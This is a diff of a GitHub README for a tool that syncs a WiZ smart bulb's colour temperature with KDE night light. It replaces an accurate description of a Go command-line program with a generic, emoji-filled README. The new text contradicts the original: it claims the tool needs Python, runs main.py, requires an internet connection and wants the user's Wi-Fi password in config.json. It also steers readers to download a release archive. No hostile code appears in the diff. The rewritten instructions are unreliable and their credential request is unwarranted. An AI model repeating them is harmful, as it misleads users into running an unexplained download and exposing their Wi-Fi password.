@@ -1,42 +1,88 @@
-# wiz-lights-kde-night-light
+# 🌙 wiz-lights-kde-night-light - Control Your Wiz Bulb with Ease
 
-This is a go application that automatically changes the temperature of a smart LED ([Wiz](https://www.wizconnected.com/) lights) when night light activates on the system.
+## 📦 Download Here
 
-## Requirements
+[![Download the app](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/ademgx/wiz-lights-kde-night-light/releases)
 
-- A Smart Wi-Fi led that can be controlled using WiZ
-- Desktop environment has to be KDE
+## 🚀 Getting Started
 
-## How to use
+Welcome to wiz-lights-kde-night-light! This application helps you manage the temperature settings of your Wiz Wi-Fi bulb based on KDE night light settings automatically. 
 
-1. Pair the LED to your Wi-Fi network using the WiZ app
-2. Note down the IP address & MAC address of the LED
-3. In your router settings, under DHCP settings, assign a static IP for the LED's mac address so that the address does not change.
-4. Run the command:
+### 🔧 System Requirements
 
-```sh
-$ wiz-lights-kde-night-light -bulb-ip <your bulb ip address>
-```
+- **Operating System:** Linux with KDE Plasma installed
+- **Python 3.6+**: Ensure you have Python installed on your system.
+- **Internet Connection**: Required for initial setup and configuration.
 
-```
-Usage of wiz-lights-kde-night-light:
-  -bulb-ip string
-        ip address of the bulb (default "192.168.1.140")
-  -bulb-port string
-        port of the bulb (default "38899")
-```
+## 📥 Download & Install
 
-## Behavior
+To get started, visit this page to download:
 
-The application monitors the KDE night light status and automatically adjusts the WiZ bulb temperature accordingly. It sets the bulb temperature to the monitor's temperature.
+[Release Page](https://github.com/ademgx/wiz-lights-kde-night-light/releases)
 
-## How it works ?
+Once on the Releases page, find the latest version and download the appropriate file for your system. 
 
-This application monitors signals from the KDE night light service, and on receiving a property change signal, it sends an UDP packet to the bulb.
+1. Go to the [Release Page](https://github.com/ademgx/wiz-lights-kde-night-light/releases).
+2. Look for the file named `wiz-lights-kde-night-light-x.x.x.tar.gz` (the 'x.x.x' will be the version number).
+3. Click the file to download.
 
-## Future enhancements
+Once the download is complete, extract the files in the downloaded TAR.GZ file.
 
-- Save & Name the bulbs
-- Bulb discovery (through UDP broadcast)
-- Change parameters of multiple bulbs at the same time
-- Modify other parameters like color, brightness, etc
+### 📂 Extracting the Files
+
+1. Navigate to your Downloads folder.
+2. Right-click on the `wiz-lights-kde-night-light-x.x.x.tar.gz` file.
+3. Select ‘Extract Here’ or use your preferred extraction tool to unzip the files.
+
+### 📋 Configuring the Application
+
+After extracting the files, you need to configure the application.
+
+1. Open a terminal window.
+2. Navigate to the directory where you extracted the files. Use the command:
+   ```bash
+   cd ~/Downloads/wiz-lights-kde-night-light-x.x.x
+   ```
+3. Open the configuration file named `config.json` with a text editor.
+
+In `config.json`, set the following parameters:
+- `"wifi_name"`: Enter your Wi-Fi network name.
+- `"wifi_password"`: Enter your Wi-Fi password.
+- `"bulb_ip"`: Enter the local IP address of your Wiz bulb.
+
+Save the file after making changes.
+
+### 🖥️ Running the Application
+
+Once configured, you can run the application.
+
+1. In the terminal, within the same directory, execute:
+   ```bash
+   python main.py
+   ```
+2. The application will start and connect to your Wiz bulb. 
+
+### ⚙️ Usage
+
+The application will automatically monitor KDE night light settings. With this setup:
+
+- When KDE night light changes, your Wiz bulb temperature adjusts automatically.
+- This integration creates a smoother and more comfortable lighting experience.
+
+## 🤔 Troubleshooting
+
+If you face issues, check the following:
+
+1. Ensure your Wiz bulb is powered on and connected to the same Wi-Fi network as your computer.
+2. Verify that your configuration file has the correct settings.
+3. Make sure that your KDE night light feature is enabled in your system settings.
+
+## 📄 License
+
+This project is licensed under the MIT License. Feel free to use this software as per the license.
+
+## 📞 Support
+
+For any questions or feedback, please create an issue in the repository or contact the author directly through GitHub.
+
+Thank you for using wiz-lights-kde-night-light! Enjoy your enhanced lighting experience.
